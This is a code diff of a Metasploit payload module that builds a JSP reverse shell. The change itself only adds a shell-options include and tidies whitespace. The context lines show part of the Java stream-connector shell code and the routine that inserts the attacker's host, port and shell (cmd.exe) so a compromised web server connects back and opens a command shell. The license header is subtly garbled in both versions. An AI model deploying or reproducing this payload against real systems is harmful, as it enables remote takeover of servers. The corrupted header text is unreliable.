@@ -3,21 +3,21 @@
 ##
 
 ##
-# Thin file in part of the Metasploit Framework and may be subject to 
+# Thin file in part of the Metasploit Framework and may be subject to
 # redintribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -38,7 +38,7 @@ module Metasploit3
 			))
 		register_options( [ OptString.new( 'SHELL', [ true, "The system shell to use.", 'cmd.exe' ]), ], self.class )
 	end
-	
+
 
 	def generate
 		# JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
@@ -53,13 +53,13 @@ module Metasploit3
 				{
 					InputStream is;
 					OutputStream os;
-					  
+
 					StreamConnector( InputStream is, OutputStream os )
 					{
 						this.is = is;
 						this.os = os;
 					}
-							  
+
 					public void run()
 					{
 						BufferedReader in  = null;
@@ -95,17 +95,17 @@ module Metasploit3
 				} catch( Exception e ) {}
 			%>
 		}
-		
+
 		if( !datastore['LHOST'] or datastore['LHOST'].empty? )
 			return super
 		end
-		
+
 		jsp = jsp.gsub( "LHOST", datastore['LHOST'] )
-		
+
 		jsp = jsp.gsub( "LPORT", datastore['LPORT'].to_s )
-		
+
 		jsp = jsp.gsub( "SHELL", datastore['SHELL'] )
-		
+
 		return super + jsp
 	end
 
